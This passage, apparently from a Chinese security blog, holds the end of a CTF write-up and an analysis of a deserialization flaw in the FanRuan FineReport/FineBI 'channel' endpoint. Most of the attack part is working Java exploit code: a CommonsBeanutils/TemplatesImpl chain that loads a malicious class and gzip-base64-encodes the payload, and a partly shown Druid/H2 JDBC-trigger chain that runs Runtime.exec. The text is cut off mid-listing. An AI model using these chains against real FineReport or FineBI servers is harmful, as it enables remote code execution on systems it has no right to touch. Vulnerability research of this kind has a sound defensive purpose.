&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆcalcåºåˆ—åŒ–å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">calc</span>();</span><br><span class="line">        <span class="type">byte</span>[] serialize = serialize(calc);</span><br><span class="line">        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(serialize)));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><p>è¿™é‡Œæ˜¯æˆ‘æœ¬åœ°å¤ç°çš„ï¼Œæ‰€ä»¥å…¨éƒ¨åœ¨æœ¬åœ°ï¼Œå…ˆæŠŠcalcé‚£ä¸ªç±»ç¼–è¯‘æˆå­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac calc.java</span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å¯ç›‘å¬ï¼Œå…ˆå‘é€ç¬¬ä¸€ä¸ªpayloadæŠŠè¿œç¨‹åœ°å€æ‰“è¿›å»</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311147336.png" alt="image.png"></p><p>ç„¶åå‘é€calcçš„åºåˆ—åŒ–æ•°æ®</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311147197.png" alt="image.png"></p><p>ç¨ç­‰ä¸€ä¸‹æ”¶åˆ°shell</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311212197.png" alt="image-20240831121235908"></p><p>ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œæˆ‘æœ¬åœ°ä¹Ÿæ˜¯æ‰“äº†å¾ˆå¤šéæ‰æˆåŠŸï¼Œå¯èƒ½æ˜¯Jacksonçš„ä¸ç¨³å®šæ€§ ï¼Œç„¶åæˆ‘ä¸€å¼€å§‹è¿˜æœ‰ä¸€ä¸ªç–‘æƒ‘çš„ç‚¹ï¼Œæˆ‘ä»¬Runtimeä¸æ˜¯è¢«banäº†ä¸ºå•¥æœ€åè¿˜å¯ä»¥ç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤ï¼Ÿå…¶å®è¿™é‡Œè™½ç„¶Runtimeè¢«åŠäº†ï¼Œä½†æ˜¯æˆ‘ä»¬æ‰“è¿›å»çš„æ˜¯calcç±»ï¼Œååºåˆ—åŒ–çš„æ—¶å€™åªä¼šåŒ¹é…åˆ°è¿™ä¸ªç±»ï¼Œè€Œä¸€å¼€å§‹çš„é“¾å­payloadé‡Œé¢ä¹Ÿæ ¹æœ¬æ²¡ç”¨Runtimeç±»ï¼Œæ‰€ä»¥è¿™é‡Œå°±å¯ä»¥ç”¨äº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¸†è½¯ FineReport/FineBI channelååºåˆ—åŒ–åˆ†æ</title>
      <link href="/2024/08/%E5%B8%86%E8%BD%AF-FineReport-FineBI-channel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
      <url>/2024/08/%E5%B8%86%E8%BD%AF-FineReport-FineBI-channel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>éšæ‰‹è®°å½•ä¸€ä¸‹</p><h2 id="è§¦å‘ç‚¹åˆ†æ"><a href="#è§¦å‘ç‚¹åˆ†æ" class="headerlink" title="è§¦å‘ç‚¹åˆ†æ"></a>è§¦å‘ç‚¹åˆ†æ</h2><p>æˆ‘è¿™é‡Œçš„ä»£ç æ˜¯FineBI5.1.0çš„ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬è·¯ç”±æ˜¯é€šè¿‡æ³¨è§£å½¢å¼å®ç°çš„ï¼Œå› ä¸ºæ˜¯å¤ç°æ‰€ä»¥ç›´æ¥æ¥åˆ°æ¼æ´æ¥å£</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041104230.png" alt="Untitled"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªchannelæ¥å£å°±æ˜¯æˆ‘ä»¬æ¼æ´ç‚¹äº†ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶çš„æ¥å£éƒ½æ˜¯åœ¨<code>/remote/design</code> è·¯ç”±ä¸‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041104961.png" alt="Untitled"></p><p>ä½†æ˜¯å®é™…è®¿é—®éœ€è¦åŠ ä¸ŠåŒ…å&#x2F;decision&#x2F;è‡³äº&#x2F;webroot&#x2F;åº”è¯¥å°±æ˜¯æ•´ä¸ªé¡¹ç›®çš„ç›®å½•åäº†ï¼Œå…·ä½“çš„è·¯ç”±å®šä¹‰æ²¡æ‰¾åˆ°ï¼Œåªèƒ½è¿™æ ·çŒœæµ‹äº†ï¼Œå…³äºè·¯ç”±åˆ†æè¿˜æ˜¯å¾—å†ç»ƒç»ƒã€‚ã€‚ã€‚</p><p>å¯ä»¥çœ‹åˆ°åœ¨channelæ¥å£ä¸‹è·å–äº†requestè¯·æ±‚ï¼Œå°†å…¶è½¬åŒ–ä¸ºè¾“å…¥æµï¼Œç„¶åå†™è¿›è¾“å‡ºæµï¼ˆæ„Ÿè§‰Javaçš„IOæµä¹Ÿå¾—å¥½å¥½å­¦å­¦ï¼Œæ•´çš„æˆ‘ä¸€æ„£ä¸€æ„£çš„ï¼‰ï¼Œè¿‡ç¨‹ä¸­è°ƒç”¨äº†<br><code>WorkContext.handleMessage()</code>  **å¯¹è¯·æ±‚è¿›è¡Œäº†å¤„ç†ï¼Œç›´æ¥è·Ÿè¿›è¿™ä¸ªæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041104865.png" alt="Untitled"></p><p>ç„¶å<code>*messageListener</code>* æ˜¯<code>WorkspaceMessageHandler</code> çš„å¯¹è±¡è‡ªç„¶ä¹Ÿå°±è·³è½¬åˆ°è¿™ä¸ªæ¥å£äº†ï¼Œè¿™é‡Œå®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»åº”è¯¥åªæœ‰ä¸€ä¸ªï¼Œæˆ‘ç‚¹å‡»è·Ÿè¿›ç›´æ¥å°±è·³è½¬äº†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105156.png" alt="Untitled"></p><p>çœ‹åˆ°äº†ç±»ä¼¼ååºåˆ—åŒ–çš„æ–¹æ³•<code>deserializeInvocation</code> è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105034.png" alt="Untitled"></p><p>æ­¤æ—¶å°±å¾—æ³¨æ„äº†ï¼Œé™¤äº†æˆ‘ä»¬å¯æ§çš„å‚æ•°æµåˆ°äº†è¿™é‡Œï¼Œåé¢è¿˜æ‰§è¡Œäº†ä¸€ä¸ª<code>GZipSerializerWrapper.wrap(InvocationSerializer.getDefault())</code> å¯¹äºè¿™ä¸ª<code>wrap</code> ä¼ å…¥çš„æ˜¯<code>InvocationSerializer</code> ç±»çš„å®ä¾‹ï¼Œè·Ÿè¿›è¿™ä¸ª<code>wrap</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105946.png" alt="Untitled"></p><p>è·Ÿè¿›è¿™ä¸ªç±»</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105997.png" alt="Untitled"></p><p>æ¥åˆ°æ„é€ å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ª<code>this.serializer</code> å³<code>InvocationSerializer</code> ç±»çš„å®ä¾‹ï¼Œè¿™ä¸ªåˆ†æåé¢ä¼šæœ‰ç”¨ï¼Œå›åˆ°ä¹‹å‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Invocation <span class="title function_">deserializeInvocation</span><span class="params">(<span class="type">byte</span>[] paramArrayOfbyte, FineResult paramFineResult)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> SerializerHelper.&lt;Invocation&gt;deserialize(paramArrayOfbyte, GZipSerializerWrapper.wrap(InvocationSerializer.getDefault()));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        paramFineResult.setResult(<span class="literal">null</span>);</span><br><span class="line">        paramFineResult.setException(exception);</span><br><span class="line">        <span class="keyword">throw</span> exception;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›è¿™ä¸ª<code>deserialize</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105305.png" alt="Untitled"></p><p>å¯ä»¥çœ‹åˆ°å¯æ§å‚æ•°æµåˆ°äº†ååºåˆ—åŒ–è¿™é‡Œï¼Œååºåˆ—åŒ–å™¨<code>paramSerializer</code> å³æˆ‘ä»¬ä¸Šé¢åˆ†æçš„<br><code>GZipSerializerWrapper</code> ç±»ï¼Œè·Ÿè¿›<code>deserialize</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105193.png" alt="Untitled"></p><p>æ­¤æ—¶å¾ˆæ˜¾ç„¶æˆ‘ä»¬åº”è¯¥é€‰ç¬¬äºŒä¸ª</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105384.png" alt="Untitled"></p><p>è€Œè¿™é‡Œçš„<code>this.serializer</code> å³æˆ‘ä»¬ä¸Šé¢åˆ†æçš„<code>InvocationSerializer</code> ç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ¬¡è·Ÿè¿›<br><code>deserialize</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106256.png" alt="Untitled"></p><p>æ­¤æ—¶å°±é€‰æ‹©ç¬¬å››ä¸ªäº†ï¼Œå…¶å®æœ‰è°ƒè¯•çš„è¯å®Œå…¨ä¸ç”¨è¿™ä¹ˆåˆ†æï¼Œç›´æ¥è·Ÿç€è·³å°±è¡Œäº†ï¼Œä½†æ˜¯æˆ‘è°ƒè¯•ç¯å¢ƒæ²¡å¼„å¥½ã€‚ã€‚ã€‚</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106483.png" alt="Untitled"></p><p>å‡ºç°äº†ä¸¤ä¸ªreadObejctæ–¹æ³•ï¼Œå³æˆ‘ä»¬ååºåˆ—åŒ–çš„ç»ˆç‚¹äº†</p><h2 id="é“¾å­æ„é€ "><a href="#é“¾å­æ„é€ " class="headerlink" title="é“¾å­æ„é€ "></a>é“¾å­æ„é€ </h2><h3 id="CBé“¾"><a href="#CBé“¾" class="headerlink" title="CBé“¾"></a>CBé“¾</h3><p>æ„é€ é“¾å­ç®€å•çš„å°±æ˜¯å…ˆæ‰¾å­˜ä¸å­˜åœ¨æœ‰å†å²æ¼æ´çš„ä¾èµ–ï¼Œé‚£æ ·æ¯”è¾ƒå¥½æ‰¾è§¦å‘ç‚¹ï¼Œä¹ä¸€çœ‹æ²¡çœ‹åˆ°ç†Ÿæ‚‰çš„ä¾èµ–ï¼Œå…¶å®å¸†è½¯éƒ½å†…ç½®äº†ï¼ŒåŸºæœ¬ä¸Šåœ¨ä¸‹é¢è¿™ä¸ªjaråŒ…</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106937.png" alt="Untitled"></p><p>æ˜æ˜¾çš„CBä¾èµ–ï¼Œä½†æ˜¯ä¼¼ä¹å¹¶ä¸çŸ¥é“ç‰ˆæœ¬ï¼Œç›´æ¥ç”¨æºç çš„jaråŒ…å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.jcraft.jzlib.GZIPInputStream;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ— CCä¾èµ–</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, beanComparator);</span><br><span class="line">        queue.add(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Serialize(queue);</span></span><br><span class="line">        Unserialize(<span class="string">&quot;H4sIAAAAAAAAAK1Uz2/cRBh9s3Z2ky.....&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŒ…è£…æˆZIP</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">baos3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">GZIPOutputStream</span> <span class="variable">gos3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos3);</span><br><span class="line">        gos3.write(baos.toByteArray());</span><br><span class="line">        gos3.finish();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos3.toByteArray());</span><br><span class="line">        System.out.println(base64str);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">(String base64str)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64str));</span><br><span class="line">        <span class="keyword">final</span> <span class="type">GZIPInputStream</span> <span class="variable">gis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(bais);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(gis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡yakitå‘åŒ…æ¯”è¾ƒæ–¹ä¾¿ï¼Œå› ä¸ºæºç å¹¶æ²¡æœ‰è¿›è¡Œbase64è§£ç ï¼Œæ‰€ä»¥ç”¨yakitçš„fuzztag</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106690.png" alt="Untitled"></p><p>å¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106515.png" alt="Untitled"></p><p>åœ¨5.1.18è¿™ä¸ªpayloadå¤±æ•ˆï¼ŒåŸæœ¬çš„<code>InputStream</code>å¯¹è±¡å·²è¢«<code>JDKSerializer.CustomObjectInputStream</code> å¦‚æœç±»åœ¨é»‘åå•åˆ™ä¸è¿›è¡Œååºåˆ—åŒ–</p><h3 id="ä¸çŸ¥é“å«ä»€ä¹ˆé“¾"><a href="#ä¸çŸ¥é“å«ä»€ä¹ˆé“¾" class="headerlink" title="ä¸çŸ¥é“å«ä»€ä¹ˆé“¾"></a>ä¸çŸ¥é“å«ä»€ä¹ˆé“¾</h3><p>è¿™æ¡é“¾åªå…¬å¼€äº†ä¸€å°ä¼šæ–‡ç« å°±è¢«ä¸‹æ¶äº†ï¼Œä¸‹é¢è¿™ä¸ªpocæ˜¯è¦å¸¦h2åº“çš„ï¼Œé»˜è®¤ä¸å­˜åœ¨ï¼Œé»˜è®¤å­˜åœ¨çš„ä¸ºhsqldb</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sql</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        druidXADataSource.getXAConnection();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//é€šè¿‡jacksonè§¦å‘getterå³getXAConnection()ï¼ŒJSONArrayçš„toStringä¼šè°ƒç”¨jacksonåŸç”Ÿååºåˆ—åŒ–</span></span><br><span class="line">        <span class="comment">//å³writeValueAsStringï¼Œä»è€Œè§¦å‘getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è§¦å‘UIDefaults$TextAndMnemonicHashMapçš„getæ–¹æ³•</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">transactionHistogram</span> <span class="operator">=</span> DruidAbstractDataSource.class.getDeclaredField(<span class="string">&quot;transactionHistogram&quot;</span>);</span><br><span class="line">        transactionHistogram.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transactionHistogram.set(druidXADataSource,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">initedLatch</span> <span class="operator">=</span> DruidDataSource.class.getDeclaredField(<span class="string">&quot;initedLatch&quot;</span>);</span><br><span class="line">        initedLatch.setAccessible(<span 